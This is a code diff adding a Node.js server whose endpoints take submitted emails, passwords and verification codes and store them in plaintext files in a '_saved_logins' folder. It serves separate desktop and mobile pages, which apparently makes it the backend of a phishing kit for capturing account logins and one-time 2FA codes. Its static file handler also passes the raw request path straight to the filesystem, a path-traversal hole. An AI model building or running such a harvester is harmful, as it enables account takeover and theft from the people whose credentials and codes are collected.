@@ -1,0 +1,103 @@
+const http = require('http');
+const fs = require('fs');
+const path = require('path');
+const url = require('url');
+
+const PORT = 3000;
+const SAVE_DIR = path.join(__dirname, '_saved_logins');
+const MIME = {
+    '.html': 'text/html; charset=utf-8',
+    '.js': 'application/javascript; charset=utf-8',
+    '.css': 'text/css; charset=utf-8',
+    '.json': 'application/json',
+    '.png': 'image/png',
+    '.webp': 'image/webp',
+    '.ico': 'image/x-icon',
+};
+
+const server = http.createServer((req, res) => {
+    const parsed = url.parse(req.url, true);
+    const pathname = parsed.pathname;
+
+    if (req.method === 'POST' && pathname === '/api/save-login') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const { email, password } = data;
+                if (!email || !password) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ error: 'email dan password wajib diisi' }));
+                    return;
+                }
+                if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
+                const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
+                const filePath = path.join(SAVE_DIR, safeName);
+                const content = `Email/Username: ${email}\nPassword: ${password}\nTersimpan: ${new Date().toISOString()}\n`;
+                fs.writeFileSync(filePath, content, 'utf-8');
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true, file: safeName }));
+            } catch (e) {
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: e.message }));
+            }
+        });
+        return;
+    }
+
+    if (req.method === 'POST' && pathname === '/api/save-code') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', () => {
+            try {
+                const data = JSON.parse(body);
+                const { email, code } = data;
+                if (!email || !code) {
+                    res.writeHead(400, { 'Content-Type': 'application/json' });
+                    res.end(JSON.stringify({ error: 'email dan code wajib diisi' }));
+                    return;
+                }
+                if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
+                const safeName = email.replace(/[^a-z0-9@_.-]/gi, '_') + '.txt';
+                const filePath = path.join(SAVE_DIR, safeName);
+                let existing = '';
+                if (fs.existsSync(filePath)) {
+                    existing = fs.readFileSync(filePath, 'utf-8') + '\n';
+                }
+                const content = `${existing}Kode Verifikasi: ${code}\nTersimpan: ${new Date().toISOString()}\n`;
+                fs.writeFileSync(filePath, content, 'utf-8');
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ ok: true, file: safeName }));
+            } catch (e) {
+                res.writeHead(500, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: e.message }));
+            }
+        });
+        return;
+    }
+
+    let filePath;
+    if (pathname === '/') {
+        const ua = (req.headers['user-agent'] || '').toLowerCase();
+        const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+        filePath = path.join(__dirname, isMobile ? 'indexm.html' : 'index.html');
+    } else {
+        filePath = path.join(__dirname, pathname);
+    }
+    const ext = path.extname(filePath);
+    fs.readFile(filePath, (err, data) => {
+        if (err) {
+            res.writeHead(404, { 'Content-Type': 'text/plain' });
+            res.end('404 Not Found');
+            return;
+        }
+        res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
+        res.end(data);
+    });
+});
+
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`Server jalan di http://localhost:${PORT}`);
+    console.log(`Data login tersimpan ke: ${SAVE_DIR}`);
+});
